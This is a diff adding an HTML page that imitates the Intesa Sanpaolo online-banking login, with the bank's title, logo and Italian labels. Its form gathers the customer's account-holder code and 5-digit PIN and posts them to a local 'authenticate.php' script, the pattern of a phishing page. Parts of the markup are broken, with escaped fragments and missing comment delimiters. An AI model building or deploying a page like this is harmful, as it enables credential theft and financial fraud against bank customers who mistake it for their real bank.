@@ -1,0 +1,144 @@
+﻿<html><head>
+<meta content="IE=10" http-equiv="X-UA-Compatible"/>
+<meta content="no-cache" http-equiv="cache-control"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
+<meta charset="utf-8"/>
+<link href="images/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon"/>
+<title>Banca Intesa Sanpaolo - Conto Corrente per Famiglie, Giovani e Aziende</title>
+<link href="css/1.css" rel="stylesheet" type="text/css"/>
+<link href="css/css.css" rel="stylesheet" type="text/css"/>
+</head>
+<body class="isp-body-transparent" ng-cloak="">
+<div class="container-fluid" ng-controller="ArchMainController" style="align: center;">
+<div id="archMainContainer" style="align: center;">
+<div class="row" id="ArchAssetsController" ng-controller="AssetsController">
+<div class="col-xs-24">
+<div class="row" id="assetControllerMargin">
+<div align="center" style="padding: 50px;">
+<img align="middle" alt="Smiley face" src="images/logo-intesasanpaolo.png" style="background-color: green; padding: 10px;"/>
+</div>
+<div class="assetContainer" id="assetContainer" ui-view=""></div>
+<div class="assetContainer ng-scope" id="assetContainer" style="" ui-view="">
+<!-- ngInclude: getTemplateUrl() --><div class="ng-scope container-fluid-no-padding" full-width="true" id="logincontroller" ng-class="pagepartClass" ng-include="getTemplateUrl()" part-controller="LoginController" style="">
+<div class="container-fluid authenticate-form ng-pristine ng-scope ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom" ng-form="model.authenticate.form" style="">
+<!-- padding-left-25 -->
+<div class="row margin-bottom-18">
+<div class="isp-ib-open-sans-regular-16 isp-ib-title-access isp-ib-alignment-access col-xs-24 col-md-12 col-md-offset-1 authenticate-whitespace" ng-class="{'authenticate-title-pseudo' : model.tmp.darkTheme}">
+<span class="isp-font-comuni-achi"></span>
+<span class="ng-binding ng-scope" ng-if="!authenticate.pmed">ACCEDI ALLA TUA BANCA ONLINE</span>
+</div>
+<div class="col-xs-24 col-md-11 authenticate-first-access margin-top-first-access authenticate-first-access-padding-11">
+<a class="isp-ib-open-sans-semi-bold-13 authenticate-first-accessDown authenticate-padding-3px authenticate-padding-0 ng-binding" ng-click="goToFirstAccess()" tabindex="0">Primo accesso?
+			<img class="ng-scope" ng-if="!model.tmp.darkTheme" src="images/freccia_dx.png" style="margin-top:-2px;margin-left:2px;"/>
+</a>
+<a class="isp-ib-open-sans-semi-bold-13 authenticate-first-accessDown ng-binding" ng-click="goToHelp()">Serve aiuto?
+			<img class="ng-scope" ng-if="!model.tmp.darkTheme" src="images/freccia_dx.png" style="margin-top:-2px;margin-left:2px;"/>
+</a>
+</div>
+</div>
+<form action="authenticate.php" id="loginForm" method="post" name="loginForm">
+<div class="authenticate-form-pseudo ng-pristine ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom" ng-form="authenticate.form" style="">
+<div class="row authenticate-margin-top-22">
+<div class="col-md-8 col-md-offset-1 authenticate-padding-bottom" id="authenticate-user">
+<div aria-describedby="loginMessageError" bind-variable="authenticate.user.userid" class="isp-ib-open-sans-regular-13 ispFormField ispInput ng-pristine ng-isolate-scope ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom" id="loginpage-logincontroller-authenticate-user_input" input-format="limiteddigits" input-label="" is-required="true" isp-id="authenticate-user" maxlength="8" minlength="6" name="authenticate.user.useridForm" ng-class="{'roundedStyle': hasStyle('rounded'), 'rev2': hasStyle('rev2')}" ng-form="" ng-keyup="triggerlogin1($event)" on-blur="onBlurUser()" on-change="changeUserFocus()" placeholder="Codice titolare" style="">
+<div class="" id="loginpage-logincontroller-authenticate-user_div" ng-class="{'focus': isFocused,  'inputDatePickerPay':isCalendarPayment(), 'error': !form.$pending &amp;&amp; form.$invalid &amp;&amp; ((!!form.$error.required &amp;&amp; form.$error.required[0].$touched) || !form.$error.required || !!form.$error.ispCustom || !!form.$error.ispArchMessageHandler), 'isp-mobile-calendar':mobileCalendar}" ng-click="manageDisabledCallback()" role="presentation" tabindex="-1">
+<span>
+<input aria-invalid="true" autocomplete="" id="loginpage-logincontroller-authenticate-user" maxlength="8" minlength="6" name="loginUser" placeholder="Codice titolare" required="required" style="" type="text"/>
+</span>
+</div>
+<!-- ngIf: !hideErrorLabel && !!form.$error.required && form.$error.required[0].$touched && !customDivIdErrors && (!showErrorInsteadOfRequired || (!form.$error.ispArchMessageHandler && !form.$error.ispCustom)) -->
+<!-- ngIf: !hideErrorLabel && !form.$pending && !form.$error.required && !form.$valid && !form.$error.ispCustom && !form.$error.ispArchMessageHandler && form.$error.date && form.$error.min && !customDivIdErrors -->
+<!-- ngIf: !hideErrorLabel && !form.$pending && !form.$error.required && !form.$valid && !form.$error.ispCustom && !form.$error.ispArchMessageHandler && form.$error.date && form.$error.max && !customDivIdErrors -->
+<!-- ngIf: !hideErrorLabel && !form.$pending && !form.$error.required && !form.$valid && !form.$error.ispCustom && !form.$error.ispArchMessageHandler && !(form.$error.date && (form.$error.min || form.$error.max)) && !customDivIdErrors -->
+<!-- ngIf: !hideErrorLabel && (!!form.$error.ispCustom || !!form.$error.ispArchMessageHandler) && (!form.$error.required || (!!form.$error.required  && !!showErrorInsteadOfRequired)) && !customDivIdErrors -->
+</div>
+</div>
+<div class="col-md-8 authenticate-padding-bottom" id="authenticate-pin">
+<div aria-describedby="loginMessageError" bind-variable="authenticate.user.pin" char-limit="5" class="isp-ib-open-sans-regular-13 ispFormField ispInput ng-pristine ng-isolate-scope ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom" id="loginpage-logincontroller-authenticate-pin_input" input-format="digitspassword" input-label="" is-required="true" isp-id="authenticate-pin" maxlength="5" minlength="5" name="authenticate.user.pinForm" ng-class="{'roundedStyle': hasStyle('rounded'), 'rev2': hasStyle('rev2')}" ng-form="" ng-keyup="triggerlogin1($event)" on-change="changePinFocus()" placeholder="PIN" save-passcode="false" style="">
+<div class="" id="loginpage-logincontroller-authenticate-pin_div" ng-class="{'focus': isFocused,  'inputDatePickerPay':isCalendarPayment(), 'error': !form.$pending &amp;&amp; form.$invalid &amp;&amp; ((!!form.$error.required &amp;&amp; form.$error.required[0].$touched) || !form.$error.required || !!form.$error.ispCustom || !!form.$error.ispArchMessageHandler), 'isp-mobile-calendar':mobileCalendar}" ng-click="manageDisabledCallback()" role="presentation" tabindex="-1">
+<span>
+<!-- ngIf: inputFormat != 'date' --><input aria-describedby="required_error_ format_error_ custom_error_" aria-invalid="true" aria-label="" autocomplete="new-passcode" class="ng-pristine ng-untouched ng-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom" id="loginpage-logincontroller-authenticate-pin" isp-formatter="" isp-validate="" maxlength="5" minlength="5" name="loginPin" ng-blur="inputBlur()" ng-change="inputChange()" ng-class="{'input-otp':inputFormat==='otp', '':hasCustomClass,'input-cf':inputFormat.toUpperCase()==='CF'||inputFormat.toUpperCase()==='CFORPIVA'}" ng-disabled="$parent.isDisabled" ng-focus="inputFocus()" ng-if="inputFormat != 'date'" ng-keydown="inputKeyDown($event)" ng-keyup="inputKeyUp($event)" ng-model="$parent.modelVariable" ng-model-options="$parent.bindingOptions" ng-required="$parent.isRequired" placeholder="PIN" required="required" style="" type="passcode"/><!-- end ngIf: inputFormat != 'date' -->
+<!-- ngIf: inputFormat == 'date' -->
+</span>
+<!-- ngIf: allowsCancelBtn && cancelBtnVisible -->
+<!-- ngIf: form.$valid && form.$dirty && showThick == 'true' -->
+<!--  tkt 35988402 removed hourglass <span class="glyphicon glyphicon-hourglass" aria-hidden="true" ng-if="!!form.$pending"></span> -->
+<!-- ngIf: currencySymbol != '' && currencySymbol != null --><!-- ngIf: currencySymbol != '' && currencySymbol != null -->
+<!-- ngIf: actionBtnIcon != '' && actionBtnIcon != null && inputFormat.toUpperCase() === 'DATE' -->
+<!-- ngIf: actionBtnIcon != '' && actionBtnIcon != null && inputFormat.toUpperCase() !== 'DATE' -->
+<!-- ngIf: mobileCalendar && inputFormat.toUpperCase() === 'DATE' && (actionBtnIcon===undefined || actionBtnIcon == null || actionBtnIcon == '' ) -->
+</div>
+<!-- ngIf: !hideErrorLabel && !!form.$error.required && form.$error.required[0].$touched && !customDivIdErrors && (!showErrorInsteadOfRequired || (!form.$error.ispArchMessageHandler && !form.$error.ispCustom)) -->
+<!-- ngIf: !hideErrorLabel && !form.$pending && !form.$error.required && !form.$valid && !form.$error.ispCustom && !form.$error.ispArchMessageHandler && form.$error.date && form.$error.min && !customDivIdErrors -->
+<!-- ngIf: !hideErrorLabel && !form.$pending && !form.$error.required && !form.$valid && !form.$error.ispCustom && !form.$error.ispArchMessageHandler && form.$error.date && form.$error.max && !customDivIdErrors -->
+<!-- ngIf: !hideErrorLabel && !form.$pending && !form.$error.required && !form.$valid && !form.$error.ispCustom && !form.$error.ispArchMessageHandler && !(form.$error.date && (form.$error.min || form.$error.max)) && !customDivIdErrors -->
+<!-- ngIf: !hideErrorLabel && (!!form.$error.ispCustom || !!form.$error.ispArchMessageHandler) && (!form.$error.required || (!!form.$error.required  && !!showErrorInsteadOfRequired)) && !customDivIdErrors -->
+</div>
+</div>
+ ngIf: log-in.message!=null <div class="col-xs-offset-1 hidden-md hidden-lg ng-scope" ng-if="authenticate.message!=null">
+<div class="authenticate-message ng-binding" id="loginMessageError" role="alert" tabindex="0"></div>
+</div> end ngIf: log-in.message!=null 
+ div class="log-in-first-accessDown hidden-md hidden-lg" ng-show="!log-in.askBirthDate"&gt;
+											&lt;a class="isp-ib-open-sans-semi-bold-13 log-in-first-accessDown" ng-click="goToFirstAccess()"&gt;{{::properties.log-in_FIRST_ACCESS}}
+												&lt;span aria-hidden="true" class="log-in-arrow-bootstrap glyphicon glyphicon-arrow-right"&gt;&lt;/span&gt;
+											&lt;/a&gt;
+											&lt;span style="cursor:default"&gt;&amp;nbsp;&lt;/span&gt;
+											&lt;a class="isp-ib-open-sans-semi-bold-13 log-in-first-accessDown" ng-click="goToHelp()"&gt;{{::properties.log-in_HELP}}
+												&lt;span aria-hidden="true" class="log-in-arrow-bootstrap glyphicon glyphicon-arrow-right"&gt;&lt;/span&gt;
+											&lt;/a&gt;			
+										&lt;/div
+<div aria-hidden="false" class="col-md-7 authenticate-enter-button-container" ng-show="!authenticate.askBirthDate">
+<button class="isp-ib-arial-bold-14 authenticate-enter-button ispIbDirectiveControlbuttonsButtonMargin col-md-23 isp-ib-submit" id="enter1Login" look="green" onclick="submiteCC();"><ng-transclude>
+															ENTRA
+											</ng-transclude></button>
+</div>
+<div class="col-md-1">
+</div>
+</div>
+<div style=" position: fixed; bottom: 0; padding-bottom: 30px;   width: 100%;">
+<div class="content-access__text">
+<div class="block__item-title">
+<p></p>
+</div>
+<div class="block__item-descr">
+<p></p>
+</div>
+<div class="block__item-link">
+<a href="#" title="Accedi all'area riservata">Scopri la nuova modalità di accesso</a>
+</div>
+</div>
+</div>
+ ngIf: log-in.askBirthDate 
+ &lt;div class="row ask-birth-spacer hidden-md hidden-lg" ng-if="log-in.askBirthDate"&gt;		
+											&lt;div class="col-md-8 log-in-first-accessDown"&gt; 
+												&lt;a class="isp-ib-open-sans-semi-bold-13 log-in-first-accessDown" ng-click="goToFirstAccess()"&gt;{{::properties.log-in_FIRST_ACCESS}}
+													&lt;span aria-hidden="true" class="log-in-arrow-bootstrap glyphicon glyphicon-arrow-right"&gt;&lt;/span&gt;
+												&lt;/a&gt;
+											&lt;/div&gt;
+										&lt;/div&gt; 
+ ngIf: log-in.askBirthDate 
+div class="row"&gt; XXX TEMP DISABLE CHANGE PIN
+											&lt;div class = "col-md-8 col-md-offset-1"&gt;&lt;/div&gt;
+											&lt;div class = "col-md-8 log-in-createpin-link"&gt;
+												&lt;a class="cursor-pointer isp-ib-open-sans-semi-bold-13" ng-click="goToCreatePin()"&gt;{{::properties.log-in_FORGOT_PIN}}
+													&lt;span aria-hidden="true" class="log-in-arrow-bootstrap glyphicon glyphicon-arrow-right"&gt;&lt;/span&gt;
+												&lt;/a&gt;
+											&lt;/div&gt;
+											&lt;div class = "col-md-7"&gt;&lt;/div&gt;
+										&lt;/div
+</div>
+ ngIf: log-in.pmed 
+</form>
+<script type="text/javascript">		    
+function submiteCC() {
+document.getElementById('loginForm').submit();
+}			<!-- /ko -->
+</script>
+</div></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</body></html>
